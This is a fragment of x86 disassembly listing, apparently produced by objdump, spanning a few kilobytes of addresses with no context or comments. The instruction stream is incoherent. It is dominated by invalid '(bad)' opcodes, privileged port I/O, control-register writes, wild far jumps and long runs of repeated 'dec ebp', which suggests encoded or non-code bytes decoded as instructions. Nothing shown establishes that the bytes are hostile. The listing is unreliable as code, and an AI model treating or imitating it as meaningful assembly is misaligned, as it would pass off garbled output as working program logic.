  424c74:	ja     0x424ccc
  424c76:	jl     0x424cef
  424c78:	push   0xfffffff6
  424c7a:	and    al,0x6f
  424c7c:	cmp    BYTE PTR [ebx+0x70],dl
  424c7f:	adc    BYTE PTR [ebp+0x7b24601],0xc
  424c86:	mov    ds:0x8df4c4c2,al
  424c8b:	lea    edi,[ecx+0x75f01650]
  424c91:	dec    ebp
  424c92:	dec    ebp
  424c93:	dec    ebp
  424c94:	xchg   edx,eax
  424c95:	in     eax,dx
  424c96:	retf   
  424c97:	outs   dx,DWORD PTR ds:[esi]
  424c98:	in     al,0xb8
  424c9a:	pusha  
  424c9b:	mov    ecx,0x50386fe9
  424ca0:	dec    edi
  424ca1:	xchg   ebp,eax
  424ca2:	dec    ebp
  424ca3:	dec    ebp
  424ca4:	dec    ebp
  424ca5:	push   eax
  424ca6:	dec    edi
  424ca7:	mov    ebp,0x504d4d4d
  424cac:	ja     0x424d08
  424cae:	push   eax
  424caf:	ja     0x424cc7
  424cb1:	add    DWORD PTR [edx+0xa96018a],edx
  424cb7:	push   eax
  424cb8:	ja     0x424ce8
  424cba:	push   eax
  424cbb:	ja     0x424cf3
  424cbd:	jl     0x424d0e
  424cbf:	or     cl,BYTE PTR [ebp+0x4d]
  424cc2:	dec    ebp
  424cc3:	bnd jmp 0x1928538
  424cc9:	popf   
  424cca:	dec    ebp
  424ccb:	dec    ebp
  424ccc:	dec    ebp
  424ccd:	push   eax
  424cce:	sbb    BYTE PTR [ebp+0x7c4d4d4d],ah
  424cd4:	dec    edi
  424cd5:	lods   eax,DWORD PTR ds:[esi]
  424cd6:	dec    ebp
  424cd7:	dec    ebp
  424cd8:	dec    ebp
  424cd9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424cda:	jmp    0x4fbe854e
  424cdf:	mov    ch,0x4d
  424ce1:	dec    ebp
  424ce2:	dec    ebp
  424ce3:	sbb    ecx,ebp
  424ce5:	outs   dx,DWORD PTR ds:[esi]
  424ce6:	cmp    BYTE PTR [edi+ecx*2-0x3b],bh
  424cea:	dec    ebp
  424ceb:	dec    ebp
  424cec:	dec    ebp
  424ced:	icebp  
  424cee:	jmp    0x4fbe8562
  424cf3:	push   edx
  424cf4:	dec    ebp
  424cf5:	dec    ebp
  424cf6:	dec    ebp
  424cf7:	sbb    ecx,ebp
  424cf9:	outs   dx,DWORD PTR ds:[esi]
  424cfa:	cmp    BYTE PTR [edi+ecx*2-0x2b],bh
  424cfe:	dec    ebp
  424cff:	dec    ebp
  424d00:	dec    ebp
  424d01:	call   0x507abcef
  424d06:	add    ebp,ebx
  424d08:	dec    ebp
  424d09:	dec    ebp
  424d0a:	dec    ebp
  424d0b:	jl     0x424d5c
  424d0d:	in     eax,0x4d
  424d0f:	dec    ebp
  424d10:	dec    ebp
  424d11:	fucompp 
  424d13:	outs   dx,DWORD PTR ds:[esi]
  424d14:	cmp    BYTE PTR [eax-0x69],dl
  424d17:	int    0x7c
  424d19:	ja     0x424d2a
  424d1b:	nop
  424d1c:	jmp    0xf0928590
  424d21:	adc    BYTE PTR [edi+esi*2+0x41],bh
  424d25:	cmc    
  424d26:	jmp    0xf092859a
  424d2b:	push   ds
  424d2c:	jl     0x424da5
  424d2e:	es (bad) 
  424d30:	jmp    0x77be85a4
  424d35:	mul    BYTE PTR ds:[edi+ebp*2]
  424d39:	cmp    BYTE PTR [ebx+0x6a],dl
  424d3c:	add    BYTE PTR [ecx+0x4f],0xa
  424d40:	dec    ebp
  424d41:	dec    ebp
  424d42:	dec    ebp
  424d43:	mov    dl,0xbe
  424d45:	or     al,0xcd
  424d47:	add    eax,0x2f4110c4
  424d4c:	inc    ebp
  424d4d:	dec    ebp
  424d4e:	dec    ebp
  424d4f:	dec    ebp
  424d50:	ins    DWORD PTR es:[edi],dx
  424d51:	in     eax,dx
  424d52:	mov    ebx,DWORD PTR [ebx]
  424d54:	in     al,0x2
  424d56:	or     dh,0x32
  424d59:	cmp    cl,BYTE PTR [ebp+0x7501018d]
  424d5f:	dec    ebp
  424d60:	dec    ebp
  424d61:	dec    ebp
  424d62:	xchg   esi,eax
  424d63:	dec    ebp
  424d64:	or     ch,dh
  424d66:	sbb    BYTE PTR [edx],0x32
  424d69:	cmp    cl,BYTE PTR [ebp+0x4518018d]
  424d6f:	dec    ebp
  424d70:	dec    ebp
  424d71:	dec    ebp
  424d72:	stos   BYTE PTR es:[edi],al
  424d73:	or     cl,BYTE PTR [ebp-0x6a]
  424d76:	out    dx,eax
  424d77:	push   eax
  424d78:	ja     0x424d77
  424d7a:	add    DWORD PTR [edi-0x7a],esi
  424d7d:	or     al,BYTE PTR [eax-0x72c5d932]
  424d83:	lea    ecx,[ebp-0x7f]
  424d86:	xor    BYTE PTR [edi-0x3],0x4d
  424d8a:	test   DWORD PTR [eax-0xf7f7589],0xedfc538a
  424d94:	add    eax,0xc86b20d
  424d99:	mov    dl,0xba
  424d9b:	sub    edi,edi
  424d9d:	mov    dl,0x50
  424d9f:	ja     0x424d50
  424da1:	xor    al,0x8a
  424da4:	xor    BYTE PTR [edi-0x76],0x53
  424da8:	push   ecx
  424da9:	in     eax,dx
  424daa:	xor    cl,BYTE PTR ds:0xb22984b2
  424db0:	mov    esi,0x80fdff0c
  424db5:	ja     0x424d3d
  424db7:	arpl   WORD PTR [edx+0x775097d5],si
  424dbd:	jbe    0x424d83
  424dbf:	or     DWORD PTR [eax+0x76f0808d],eax
  424dc5:	push   eax
  424dc6:	ja     0x424d4e
  424dc8:	xor    BYTE PTR [edi-0x7a],0x63
  424dcc:	mov    dl,0xd5
  424dce:	iret   
  424dcf:	or     BYTE PTR [edx],0x1d
  424dd2:	sbb    BYTE PTR [edx],0x26
  424dd5:	cmp    cl,BYTE PTR [ebp-0x28f19c73]
  424ddb:	stc    
  424ddc:	sbb    BYTE PTR [edx],0x26
  424ddf:	cmp    cl,BYTE PTR [ebp+0x1d0a808d]
  424de5:	arpl   WORD PTR [esi],cx
  424de7:	xlat   BYTE PTR ds:[ebx]
  424de8:	cmp    eax,DWORD PTR [eax-0x72c5d1e6]
  424dee:	lea    eax,[eax-0x557fde69]
  424df4:	cmp    eax,0xa500eec
  424df9:	and    eax,0x808b7780
  424dfe:	lock mov edx,DWORD PTR [ebx-0x4]
  424e02:	in     eax,dx
  424e03:	add    eax,0xc86b20d
  424e08:	mov    dl,0xba
  424e0a:	sub    edi,edi
  424e0c:	mov    dl,0x50
  424e0e:	ja     0x424dbf
  424e10:	adc    BYTE PTR [edi-0x796c64db],0x3
  424e17:	enter  0x4d4d,0x4f
  424e1b:	push   0x9
  424e1d:	movd   DWORD PTR [ebp-0x28b27273],mm1
  424e24:	and    eax,0x86932a80
  424e29:	sub    eax,0x4f4d4dc8
  424e2e:	push   0x9
  424e30:	pcmpeqb mm1,QWORD PTR [ebp+0x77808d8d]
  424e37:	and    eax,0x94802a80
  424e3c:	xchg   BYTE PTR [eax+0x4f4d4dc2],bh
  424e42:	push   0x9
  424e44:	mov    cr1,ebp
  424e47:	lea    ecx,[ebp-0x6e796c65]
  424e4d:	mov    ecx,DWORD PTR [ebp+0x4d]
  424e50:	dec    edi
  424e51:	push   0x9
  424e53:	ucomiss xmm1,DWORD PTR [ebp-0x317f7273]
  424e5a:	cmp    cl,BYTE PTR es:[ebp-0x28e29c73]
  424e61:	sbb    eax,DWORD PTR [eax-0x72c5cd32]
  424e67:	lea    eax,[ecx]
  424e69:	lock test BYTE PTR [esi-0x7f7b28b3],dl
  424e70:	lock and DWORD PTR [ebp-0x62],ecx
  424e74:	xchg   ebp,eax
  424e75:	xchg   ebx,eax
  424e76:	dec    ebp
  424e77:	or     ah,BYTE PTR ds:0x3a82ce80
  424e7d:	lea    ecx,[ebp-0x27f7280]
  424e83:	push   ebx
  424e84:	push   ecx
  424e85:	in     eax,dx
  424e86:	xor    cl,BYTE PTR ds:0xb20cbeb2
  424e8c:	test   BYTE PTR [ecx],ch
  424e8e:	(bad)  
  424e8f:	std    
  424e90:	aad    0x0
  424e92:	jl     0x424f0b
  424e94:	out    dx,eax
  424e95:	mul    BYTE PTR [ebx]
  424e97:	outs   dx,DWORD PTR ds:[esi]
  424e98:	cmp    BYTE PTR [eax-0xf7f1089],al
  424e9e:	out    dx,eax
  424e9f:	xor    BYTE PTR [edi+0x25],0xb2
  424ea3:	mov    esi,0xc405a20c
  424ea8:	hlt    
  424ea9:	lea    ecx,[ebp+0x197d30b9]
  424eaf:	sub    BYTE PTR [ebp+0x3d],0x80
  424eb3:	lock sub eax,0x925074ec
  424eb9:	adc    eax,0x7c2d7780
  424ebe:	(bad)  
  424ebf:	in     al,dx
  424ec0:	lea    ecx,[ebp+0x2d77808d]
  424ec6:	push   eax
  424ec7:	popf   
  424ec8:	out    dx,al
  424ec9:	xor    BYTE PTR [edi+0x71],0x80
  424ecd:	lock sub eax,0x80ef9250
  424ed3:	ja     0x424eea
  424ed5:	xor    al,0x2d
  424ed8:	push   eax
  424ed9:	xchg   edx,eax
  424eda:	and    esp,eax
  424edc:	adc    eax,0x80257780
  424ee1:	ins    DWORD PTR es:[edi],dx
  424ee2:	cmp    eax,0xec2df080
  424ee7:	je     0x424f39
  424ee9:	xchg   edx,eax
  424eea:	adc    eax,0xed2d7780
  424eef:	sub    eax,0xf7777c8d
  424ef4:	cmp    cl,BYTE PTR [ebp-0x18127273]
  424efa:	test   DWORD PTR [ebp-0x5bacf329],0xc4a37480
  424f04:	or     al,0x53
  424f06:	push   0xffffffab
  424f08:	test   eax,0x8d25fb70
  424f0d:	xchg   edi,eax
  424f0e:	add    BYTE PTR [edi+0x5c099696],0x92
  424f15:	adc    eax,0x1def7501
  424f1a:	or     DWORD PTR [edi+edi*2+0x6f],ebx
  424f1e:	xchg   ebx,eax
  424f1f:	fwait
  424f20:	jl     0x424f99
  424f22:	mov    dh,dh
  424f24:	and    al,0x6f
  424f26:	cmp    BYTE PTR [eax-0x10],dl
  424f29:	mov    ecx,DWORD PTR [edi+0x70]
  424f2c:	aad    0xb5
  424f2e:	icebp  
  424f2f:	and    ah,BYTE PTR [edi+ebp*2]
  424f32:	cmp    BYTE PTR [eax-0x187fde83],al
  424f38:	out    dx,eax
  424f39:	in     al,dx
  424f3a:	retf   
  424f3b:	pop    edi
  424f3c:	out    0x21,eax
  424f3e:	in     al,0xcf
  424f40:	sbb    ch,0xef
  424f43:	in     al,dx
  424f44:	retf   
  424f45:	in     al,dx
  424f46:	out    0xef,eax
  424f48:	pop    edi
  424f49:	out    0x21,eax
  424f4b:	in     al,0x7b
  424f4d:	xor    al,0x8a
  424f50:	and    bh,0x8a
  424f53:	push   ebx
  424f54:	(bad)  
  424f55:	in     eax,dx
  424f56:	dec    ebx
  424f57:	or     eax,0x8029bcb2
  424f5c:	mov    al,ds:0xff0cc4b2
  424f61:	push   es
  424f62:	in     eax,dx
  424f63:	mov    edx,0xeeb2ed8a
  424f68:	in     eax,dx
  424f69:	push   0x3d
  424f6b:	jnp    0x424f1f
  424f6d:	popa   
  424f6e:	sub    edi,edi
  424f70:	retf   
  424f71:	mov    ds:0x6f24f64b,al
  424f76:	cmp    BYTE PTR [edx],bh
  424f78:	out    0x8a,eax
  424f7a:	xor    al,0x8a
  424f7d:	and    bh,0x8a
  424f80:	push   ebx
  424f81:	(bad)  
  424f82:	in     eax,dx
  424f83:	dec    ebx
  424f84:	or     eax,0xb20cbeb2
  424f89:	mov    esp,0x632aff29
  424f8e:	lock mov esp,esp
  424f91:	dec    edx
  424f92:	push   ebx
  424f93:	push   0xffffffab
  424f95:	mov    ds:0x8deffb70,eax
  424f9a:	xchg   edi,eax
  424f9b:	add    BYTE PTR [edi+0x7c8187ed],0x77
  424fa2:	cmp    DWORD PTR [ebx+0x7c8d8dad],0x77
  424fa9:	stc    
  424faa:	in     al,dx
  424fab:	ror    DWORD PTR [ebp-0x7b888373],0x14
  424fb2:	ror    BYTE PTR [ebp-0x74888373],cl
  424fb8:	call   0x8a77:0x7c8dee71
  424fbf:	stc    
  424fc0:	lods   eax,DWORD PTR ds:[esi]
  424fc1:	lea    ecx,[ebp-0x5088884]
  424fc7:	dec    DWORD PTR [ebp+0x7a777c8d]
  424fcd:	dec    ebx
  424fce:	aam    0x8d
  424fd0:	lea    edi,[edi+esi*2-0x7e]
  424fd4:	in     al,dx
  424fd5:	lea    ecx,[ebp-0x79888373]
  424fdb:	mov    dl,0xb9
  424fdd:	lea    ecx,[ebp-0x7f788884]
  424fe3:	xchg   esi,eax
  424fe4:	lea    ecx,[ebp+0x332777c]
  424fea:	mov    bh,0x8d
  424fec:	lea    eax,[eax-0x73a17510]
  424ff2:	fimul  DWORD PTR [ebp-0x7f4dbc73]
  424ff8:	lock mov edx,DWORD PTR [ebx+0x72]
  424ffc:	dec    ebx
  424ffd:	add    eax,0xfd809b99
  425002:	mov    ds:0x8d90f1ba,al
  425007:	lea    esp,[edx-0x7238d090]
  42500d:	lea    esp,[edx-0x725a2bfb]
  425013:	lea    esp,[edx-0x72c2204e]
  425019:	lea    edi,[edi+esi*2-0x38]
  42501d:	div    eax
  42501f:	lea    ecx,[ebp-0x24758884]
  425025:	aad    0x8d
  425027:	lea    edi,[edi+esi*2-0x75]
  42502b:	sbb    DWORD PTR [ecx-0x73],esi
  42502e:	lea    eax,[eax-0x687f7489]
  425034:	mov    dh,BYTE PTR [edi]
  425036:	dec    ecx
  425037:	popf   
  425038:	lea    ecx,[ebp+0x77ecfb53]
  42503e:	enter  0xb680,0x57
  425042:	jnp    0x425051
  425044:	lea    ecx,[ebp-0x68af08bd]
  42504a:	mov    al,BYTE PTR [eax+0x77ec8a77]
  425050:	out    dx,eax
  425051:	adc    BYTE PTR [edi+0x2197ec8a],0x8f
  425058:	nop
  425059:	adc    BYTE PTR [ecx-0x80],dh
  42505c:	ja     0x425090
  42505e:	adc    BYTE PTR [edi-0x76e6c879],0x8d
  425065:	lea    edx,[ebx-0x5]
  425068:	adc    BYTE PTR [edi-0xe04007a],0x3
  42506f:	(bad)  [ebp-0x7f08bc73]
  425075:	ja     0x425070
  425077:	in     al,dx
  425078:	(bad)  
  425079:	icebp  
  42507a:	test   al,0x55
  42507c:	lea    ecx,[ebp-0x681308bd]
  425082:	test   BYTE PTR [eax-0x287f7c89],al
  425088:	jno    0x42500a
  42508a:	out    0x82,eax
  42508c:	mov    ds:0x8d9630c2,al
  425091:	lea    esi,[ebx]
  425093:	test   DWORD PTR [eax-0x3d5d8589],0x8d8d2db7
  42509d:	inc    ebx
  42509e:	ret    0x7253
  4250a1:	dec    ebx
  4250a2:	dec    ebx
  4250a3:	adc    BYTE PTR [edi+0x1fe757f7],0x8d
  4250aa:	lea    esi,[ebx]
  4250ac:	sti    
  4250ad:	xor    BYTE PTR [esi+0x7a2f743],0x4c
  4250b4:	fmul   DWORD PTR [ebp+0x97e638d]
  4250ba:	dec    esp
  4250bb:	mov    ds:0xab4d4d4d,eax
  4250c0:	test   eax,0x8d21fb70
  4250c5:	xchg   edi,eax
  4250c6:	add    BYTE PTR [edi-0x6c8a7813],0x99
  4250cd:	fwait
  4250ce:	jl     0x425147
  4250d0:	xchg   DWORD PTR [ebx+eiz*2+0x777c8d8d],ebx
  4250d7:	xor    dl,al
  4250d9:	jg     0x425068
  4250db:	lea    edi,[edi+esi*2-0x38]
  4250df:	pusha  
  4250e0:	xchg   esi,eax
  4250e1:	lea    ecx,[ebp-0x15748884]
  4250e7:	xchg   esi,eax
  4250e8:	lea    ecx,[ebp-0xd758884]
  4250ee:	sub    eax,0x777c8d8d
  4250f3:	sbb    ecx,0x59
  4250f6:	lea    ecx,[ebp+0x7784777c]
  4250fc:	out    dx,al
  4250fd:	lea    ecx,[ebp+0x6df9777c]
  425103:	xor    DWORD PTR [ebp-0x79888373],ecx
  425109:	sbb    ebx,DWORD PTR [edi-0x73]
  42510c:	lea    edi,[edi+esi*2+0x66]
  425110:	pop    esp
  425111:	leave  
  425112:	lea    ecx,[ebp-0x59958884]
  425118:	lea    ecx,[ebp+0x76777c8d]
  42511e:	iret   
  42511f:	cmp    DWORD PTR [ebp-0x2888373],ecx
  425125:	and    BYTE PTR [ecx],ch
  425127:	lea    ecx,[ebp+0x5caf777c]
  42512d:	iret   
  42512e:	lea    ecx,[ebp-0x1a088884]
  425134:	sbb    eax,0x77808d8d
  425139:	test   BYTE PTR [eax-0x55307c10],al
  42513f:	xor    ecx,DWORD PTR [ebp-0x58c1b873]
  425145:	lea    ecx,[ebp-0x72dcdf31]
  42514b:	lea    ecx,[ecx]
  42514d:	and    dh,BYTE PTR [edx+0x7f549e60]
  425153:	mov    eax,DWORD PTR [ebx-0x3]
  425156:	xor    BYTE PTR [edi-0x76],0x80
  42515a:	xchg   edi,eax
  42515b:	mov    esi,DWORD PTR [ebx]
  42515d:	sti    
  42515e:	adc    BYTE PTR [edi-0x36b73038],0x8d
  425165:	lea    eax,[ebx-0x5]
  425168:	adc    BYTE PTR [edi-0x7f04bcce],0x97
  42516f:	xchg   edi,edi
  425171:	sti    
  425172:	push   ebx
  425173:	jb     0x42516f
  425175:	pushf  
  425176:	ins    BYTE PTR es:[edi],dx
  425177:	dec    ebp
  425178:	dec    ebp
  425179:	dec    ebx
  42517a:	or     eax,DWORD PTR [eax-0x2f93de69]
  425180:	pop    ds
  425181:	lea    ecx,[ebp+0x7780f743]
  425187:	xchg   BYTE PTR [eax+0x7c43f9d7],al
  42518d:	or     DWORD PTR [edx],esp
  42518f:	cld    
  425190:	cli    
  425191:	mov    al,ds:0xbe309e50
  425196:	icebp  
  425197:	lea    ecx,[ebp+0x7a777c8d]
  42519d:	sbb    al,0x55
  42519f:	lea    ecx,[ebp+0x2e82777c]
  4251a5:	leave  
  4251a6:	lea    ecx,[ebp-0x327b8884]
  4251ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4251ad:	lea    ecx,[ebp+0x3a83777c]
  4251b3:	lea    ecx,[ebp-0x7c587f73]
  4251b9:	push   ebx
  4251ba:	jb     0x42521a
  4251bc:	fwait
  4251bd:	leave  
  4251be:	lea    ecx,[ebp-0x687f39b5]
  4251c4:	test   BYTE PTR [eax-0x4001059],al
  4251ca:	adc    BYTE PTR [edi-0x7f04bc7e],0x97
  4251d1:	jp     0x42520a
  4251d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4251d4:	or     DWORD PTR [ebp-0x4ddf673],0x59ef0f01
  4251de:	sub    eax,0x77508ade
  4251e3:	jp     0x425165
  4251e5:	ja     0x4251de
  4251e7:	adc    BYTE PTR [edi+0xbc835af],0x7
  4251ee:	adc    BYTE PTR [edi+0x4523357a],0x2f
  4251f5:	and    DWORD PTR [esi+ebp*8-0x4f11efb9],edx
  4251fc:	xor    BYTE PTR [edi-0x3],0xcf
  425200:	mov    es,edi
  425202:	lea    ecx,[ebp-0x7f898814]
  425208:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425209:	push   0x53
  42520b:	jb     0x425258
  42520d:	mov    BYTE PTR [eax-0x639b9969],0x6c
  425214:	dec    ebp
  425215:	dec    ebp
  425216:	aaa    
  425217:	cmp    BYTE PTR [edi-0x73],dl
  42521a:	lea    eax,[ebx-0x5]
  42521d:	push   edi
  42521e:	adc    DWORD PTR [edx+0x4d],ebp
  425221:	dec    ebp
  425222:	in     al,dx
  425223:	std    
  425224:	xor    BYTE PTR [edi-0x76],0x80
  425228:	xchg   edi,eax
  425229:	mov    esi,DWORD PTR [ebx]
  42522b:	sti    
  42522c:	adc    BYTE PTR [edi-0x36b73038],0x8d
  425233:	lea    eax,[ebx-0x5]
  425236:	adc    BYTE PTR [edi-0x7f04bcce],0x97
  42523d:	xchg   edi,edi
  42523f:	sti    
  425240:	push   ebx
  425241:	jb     0x42528e
  425243:	mov    BYTE PTR [eax-0x8bcde69],0x80
  42524a:	ja     0x4251d2
  42524c:	and    BYTE PTR [edi+0x97c43f9],0x22
  425253:	je     0x4251d5
  425255:	mov    al,ds:0x4ec8243
  42525a:	arpl   WORD PTR [ebx],ax
  42525c:	or     DWORD PTR [ebp+ebx*2+0x4d],ecx
  425260:	dec    ebp
  425261:	dec    ebp
  425262:	stos   DWORD PTR es:[edi],eax
  425263:	test   eax,0xeffb70a3
  425268:	lea    edx,[edi-0x78127880]
  42526e:	or     bh,BYTE PTR [edi+esi*2+0x62]
  425272:	in     al,0x58
  425274:	fist   WORD PTR [ecx]
  425276:	pop    esi
  425277:	xchg   BYTE PTR [edi+0x77502643],cl
  42527d:	push   esi
  42527e:	jl     0x4252f7
  425280:	pop    esi
  425281:	loop   0x4252db
  425283:	fist   WORD PTR [ecx]
  425285:	push   eax
  425286:	ja     0x4252ee
  425288:	jl     0x425301
  42528a:	push   0xffffffe6
  42528c:	pop    eax
  42528d:	fist   WORD PTR [ecx]
  42528f:	push   eax
  425290:	ja     0x425308
  425292:	xchg   ebx,eax
  425293:	jl     0x42530c
  425295:	std    
  425296:	rcr    BYTE PTR [eax-0x21],1
  425299:	adc    DWORD PTR [eax+0x77],edx
  42529c:	scas   eax,DWORD PTR es:[edi]
  42529d:	cdq    
  42529e:	fwait
  42529f:	jl     0x425318
  4252a1:	neg    DWORD PTR [ecx+0x5011df58]
  4252a7:	ja     0x425323
  4252a9:	push   ebx
  4252aa:	jb     0x4252ff
  4252ac:	dec    ebp
  4252ad:	pusha  
  4252ae:	mul    BYTE PTR [edi+ebp*2]
  4252b1:	cmp    BYTE PTR [edi+esi*2-0x7e],bh
  4252b5:	call   0x7b543212
  4252ba:	push   eax
  4252bb:	ja     0x425240
  4252bd:	xor    BYTE PTR [edx+0x50879750],0xe7
  4252c4:	stc    
  4252c5:	add    DWORD PTR [esi+0xd32ed3a],ebx
  4252cb:	mov    dl,0x84
  4252cd:	sub    edi,edi
  4252cf:	sti    
  4252d0:	add    DWORD PTR [ebp+0x78],esi
  4252d3:	bound  eax,QWORD PTR [eax-0x11627f8f]
  4252d9:	or     DWORD PTR [esi+0x3],eax
  4252dc:	or     al,0xb2
  4252de:	les    ecx,FWORD PTR [eax+eax*4]
  4252e1:	sbb    eax,0x53ee6d80
  4252e6:	push   0xffffffa2
  4252e8:	ret    0xc7a7
  4252eb:	add    al,0xd4
  4252ed:	push   edi
  4252ef:	push   eax
  4252f0:	xchg   edi,eax
  4252f1:	mov    eax,DWORD PTR [eax+0x6aec8b77]
  4252f7:	mov    dl,0xb4
  4252f9:	sub    DWORD PTR [ebx+0x77],esp
  4252fc:	and    DWORD PTR [ecx],ecx
  4252fe:	into   
  4252ff:	lea    ecx,fs:[ebp-0x74887f73]
  425306:	in     eax,dx
  425307:	mov    bh,0x86
  425309:	lea    edx,[eax-0x19]
  42530c:	xor    al,BYTE PTR [eax+0x6a4f8b77]
  425312:	aad    0xb7
  425314:	push   ebx
  425315:	push   0x50
  425317:	out    0xc8,eax
  425319:	adc    BYTE PTR [edi-0x10587f7a],0x1
  425320:	gs jno 0x4252a3
  425323:	xchg   edi,eax
  425324:	out    dx,eax
  425325:	in     al,dx
  425326:	pushf  
  425327:	push   eax
  425328:	xchg   edi,eax
  425329:	test   BYTE PTR [edi+0x4d971090],cl
  42532f:	adc    BYTE PTR [edi-0x70631375],0x15
  425336:	mov    al,0x80
  425338:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425339:	test   BYTE PTR [eax],dl
  42533b:	adc    ecx,DWORD PTR [edi-0x587fb269]
  425341:	mov    ebp,esp
  425343:	lods   al,BYTE PTR ds:[esi]
  425344:	and    bh,0xef
  425347:	adc    BYTE PTR ds:0xc8978063,dl
  42534d:	ins    DWORD PTR es:[edi],dx
  42534e:	in     eax,dx
  42534f:	clc    
  425350:	mov    dh,BYTE PTR [edx-0x412d67a]
  425356:	out    dx,al
  425357:	(bad)  
  425358:	sti    
  425359:	push   ebx
  42535a:	mov    dl,0x50
  42535c:	ja     0x425326
  42535e:	outs   dx,BYTE PTR ds:[esi]
  42535f:	xlat   BYTE PTR ds:[ebx]
  425360:	enter  0x9780,0xc8
  425364:	in     eax,dx
  425365:	xor    cl,BYTE PTR ds:0xb20c07b2
  42536b:	test   BYTE PTR [ecx],ch
  42536d:	(bad)  
  42536e:	sti    
  42536f:	adc    BYTE PTR [edi-0x1b049c75],0x34
  425376:	push   ebx
  425377:	dec    ebp
  425378:	jnp    0x4252fa
  42537a:	ja     0x4253ae
  42537c:	adc    BYTE PTR [edi-0x79587f75],0xed
  425383:	test   BYTE PTR [edx-0x7f0811ff],cl
  425389:	xchg   edi,eax
  42538a:	mov    eax,DWORD PTR [ecx]
  42538c:	adc    eax,0x21a78093
  425391:	mov    dl,0x7
  425393:	sub    edi,edi
  425395:	sti    
  425396:	push   ebx
  425397:	mov    dl,0x50
  425399:	ja     0x4253cd
  42539b:	outs   dx,BYTE PTR ds:[esi]
  42539c:	xlat   BYTE PTR ds:[ebx]
  42539d:	xor    al,BYTE PTR [eax+0x32ed3297]
  4253a3:	or     eax,0xb20c07b2
  4253a8:	test   BYTE PTR [ecx],ch
  4253aa:	(bad)  
  4253ab:	sti    
  4253ac:	adc    BYTE PTR [edi+0x4372ec8b],0x3
  4253b3:	push   eax
  4253b4:	ja     0x42533c
  4253b6:	arpl   WORD PTR [ecx+ecx*1+0x4c],si
  4253ba:	leave  
  4253bb:	dec    ebp
  4253bc:	dec    ebp
  4253bd:	dec    ebp
  4253be:	xor    BYTE PTR [edi-0x79],0x80
  4253c2:	xchg   edi,eax
  4253c3:	stc    
  4253c4:	in     eax,dx
  4253c5:	clc    
  4253c6:	mov    ch,BYTE PTR [ebp-0x13]
  4253c9:	sti    
  4253ca:	out    dx,al
  4253cb:	mov    dl,0x86
  4253cd:	sub    edi,edi
  4253cf:	sti    
  4253d0:	push   ebx
  4253d1:	mov    dl,0x80
  4253d3:	add    BYTE PTR [eax-0x1281ac09],0xc6
  4253da:	or     eax,0x5029b4b2
  4253df:	xchg   edi,eax
  4253e0:	stc    
  4253e1:	mov    dl,0x7
  4253e3:	or     al,0x50
  4253e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4253e6:	xchg   DWORD PTR [eax],esi
  4253e8:	xchg   edi,eax
  4253e9:	xchg   ebp,ebp
  4253eb:	out    0x87,eax
  4253ed:	outs   dx,DWORD PTR ds:[esi]
  4253ee:	or     edx,ebp
  4253f0:	jp     0x4253ff
  4253f2:	dec    ebp
  4253f3:	dec    ebp
  4253f4:	stos   DWORD PTR es:[edi],eax
  4253f5:	test   eax,0xeffb70a3
  4253fa:	lea    edx,[edi-0x78127880]
  425400:	adc    eax,0x7cef7780
  425405:	ja     0x425439
  425407:	mul    BYTE PTR [edi+ebp*2]
  42540a:	cmp    BYTE PTR [edi+esi*2-0x76],bh
  42540e:	cmc    
  42540f:	and    al,0x6f
  425411:	cmp    BYTE PTR [eax+0x5099938d],al
  425417:	ja     0x4253a4
  425419:	jl     0x425492
  42541b:	enter  0x24dc,0x6f
  42541f:	cmp    BYTE PTR [ebx+0x4787777c],bl
  425425:	sbb    al,0xf9
  425427:	adc    eax,DWORD PTR [eax-0xf7f7529]
  42542d:	mov    ah,dl
  42542f:	or     eax,0x6f24225e
  425434:	cmp    BYTE PTR [ebx-0x454dd5ad],ch
  42543a:	sub    DWORD PTR [ebx+0x32],edx
  42543d:	mov    dl,0x88
  42543f:	or     al,0xff
  425441:	add    eax,0x8032f080
  425446:	xchg   edi,eax
  425447:	xor    dl,BYTE PTR [ebx-0x3]
  42544a:	push   ebx
  42544b:	pushf  
  42544c:	mov    dl,0xbe
  42544e:	or     al,0xb2
  425450:	clc    
  425451:	sub    edi,edi
  425453:	dec    BYTE PTR [ecx]
  425455:	and    al,BYTE PTR ds:0x8d8d24be
  42545b:	lea    eax,[eax-0x687f7410]
  425461:	mov    edx,DWORD PTR [ebx-0x64]
  425464:	mov    dl,0xf8
  425466:	sub    DWORD PTR [ebx-0x3],edx
  425469:	mov    dl,0xbe
  42546b:	or     al,0xff
  42546d:	inc    BYTE PTR [eax-0x587f7569]
  425473:	mov    dl,BYTE PTR [ebx-0x9]
  425476:	push   ebx
  425477:	lods   al,BYTE PTR ds:[esi]
  425478:	mov    dl,0x7
  42547a:	or     al,0xb2
  42547c:	mov    ah,0x29
  42547e:	call   DWORD PTR [edi+ecx*2-0x74687f02]
  425485:	xor    al,0x8b
  425488:	aad    0x59
  42548a:	push   ebx
  42548b:	sub    dh,BYTE PTR [edx-0x8acd646]
  425491:	mov    dl,0x7
  425493:	or     al,0xff
  425495:	mov    dh,0x80
  425497:	lock mov al,BYTE PTR [eax-0x2ac7559]
  42549e:	push   ebx
  42549f:	lods   al,BYTE PTR ds:[esi]
  4254a0:	mov    dl,0xbe
  4254a2:	or     al,0xb2
  4254a4:	mov    ah,0x29
  4254a6:	call   DWORD PTR [ecx]
  4254a8:	xchg   esp,eax
  4254a9:	pop    es
  4254aa:	xor    al,0x87
  4254ad:	and    BYTE PTR [edi+0x53fd5387],0xac
  4254b4:	mov    dl,0xbe
  4254b6:	or     al,0xb2
  4254b8:	mov    ah,0x29
  4254ba:	call   DWORD PTR [ecx]
  4254bc:	push   ebx
  4254bd:	mov    dh,0xc4
  4254bf:	sub    eax,0xbab22a53
  4254c4:	sub    DWORD PTR [ebx-0x9],edx
  4254c7:	mov    dl,0x7
  4254c9:	or     al,0xff
  4254cb:	mov    dh,0x80
  4254cd:	lock mov al,BYTE PTR [eax-0x2ac7559]
  4254d4:	push   ebx
  4254d5:	lods   al,BYTE PTR ds:[esi]
  4254d6:	mov    dl,0xbe
  4254d8:	or     al,0xb2
  4254da:	mov    ah,0x29
  4254dc:	call   DWORD PTR [ecx]
  4254de:	xchg   esp,eax
  4254df:	pop    es
  4254e0:	push   eax
  4254e1:	xchg   edi,eax
